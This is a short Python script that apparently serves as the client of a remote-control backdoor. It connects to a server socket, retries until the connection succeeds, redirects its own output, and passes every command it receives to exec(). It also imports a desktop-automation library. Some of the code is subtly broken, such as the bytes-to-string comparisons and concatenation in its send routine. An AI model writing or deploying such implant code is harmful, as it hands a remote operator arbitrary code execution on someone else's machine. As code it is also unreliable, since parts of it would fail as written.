#! /usr/bin/python3
import socket
import sys
import pyautogui
from io import StringIO


IP = "127.0.0.1"
PORT = 8888
ENCODING = "UTF-8"
ADDR = (IP, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def send_out(output):
	client.send(f"tell lenght {len(output.encode(ENCODING))}".encode(ENCODING))
	response = client.recv(1024)
	if response == "tell ok":
		client.send("tell content " + output.encode(ENCODING))
		
		
while True:
	try:
		print("Trying to connect...")
		client.connect(ADDR)
		break
	except ConnectionRefusedError as e:
		pass
		
print("Connected")

running = True
old_stdout = sys.stdout
old_stderr = sys.stderr
sys.stdout = out = StringIO()
sys.stderr = err = StringIO()
while running:
	data = client.recv(1024).decode(ENCODING)
	if data.startswith("command length "):
		try:
			cmd_length = int(data[15:])
		except ValueError as e:
			client.send("command error".encode(ENCODING))
			continue
		client.send("command ok".encode(ENCODING))
		command = client.recv(cmd_length+16)
		exec(command)
	elif data == "shutdown":
		running = False
		client.close()

out.close()
err.close()
sys.stdout = old_stdout
sys.stderr = old_stderr
client.close()